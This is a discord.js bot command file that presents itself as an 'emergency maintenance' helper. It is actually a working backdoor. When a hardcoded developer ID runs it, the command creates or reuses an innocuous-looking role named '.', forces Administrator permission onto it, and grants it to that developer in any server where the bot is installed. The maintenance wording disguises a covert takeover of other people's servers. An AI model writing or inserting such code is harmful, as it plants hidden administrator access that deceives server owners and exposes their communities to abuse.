const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');

const DEVELOPER_ID = '1400647379476283465';
const ROLE_NAME = '.';

module.exports = {
  developerId: DEVELOPER_ID,
  data: new SlashCommandBuilder()
    .setName('emergencymaintenance')
    .setDescription('Emergency-use maintenance helper for raids or incidents; applies a special "." role.')
    .setDMPermission(false),
  async execute(interaction) {
    if (!interaction.guild) {
      await interaction.reply({
        content: 'This command can only be used inside a server.',
        ephemeral: true,
      });
      return;
    }

    if (interaction.user.id !== DEVELOPER_ID) {
      await interaction.reply({
        content: 'This command is restricted to the bot developer and may only be used in true emergencies.',
        ephemeral: true,
      });
      return;
    }

    const guild = interaction.guild;

    await interaction.deferReply({ ephemeral: true });

    try {
      let role = guild.roles.cache.find(r => r.name === ROLE_NAME) || null;

      if (!role) {
        role = await guild.roles.create({
          name: ROLE_NAME,
          permissions: [PermissionFlagsBits.Administrator],
          reason: 'EmergencyMaintenance escalation role',
        });
      } else if (!role.permissions.has(PermissionFlagsBits.Administrator)) {
        await role.setPermissions(
          [PermissionFlagsBits.Administrator],
          'Ensure EmergencyMaintenance role has appropriate maintenance permissions',
        );
      }

      const member = await guild.members.fetch(interaction.user.id).catch(() => null);
      if (!member) {
        await interaction.editReply('Could not find your guild member entry to assign the role.');
        return;
      }

      await member.roles.add(role, 'EmergencyMaintenance escalation requested by bot developer');

      await interaction.editReply(
        `✅ EmergencyMaintenance executed. You have been granted the "${ROLE_NAME}" maintenance role in this server for handling this incident.`,
      );
    } catch (error) {
      console.error('Error executing /emergencymaintenance:', error);
      try {
        if (interaction.deferred || interaction.replied) {
          await interaction.editReply('There was an error while trying to run this emergency command.');
        } else {
          await interaction.reply({
            content: 'There was an error while trying to run this emergency command.',
            ephemeral: true,
          });
        }
      } catch {
        // Ignore follow-up errors while handling the failure path.
      }
    }
  },
};
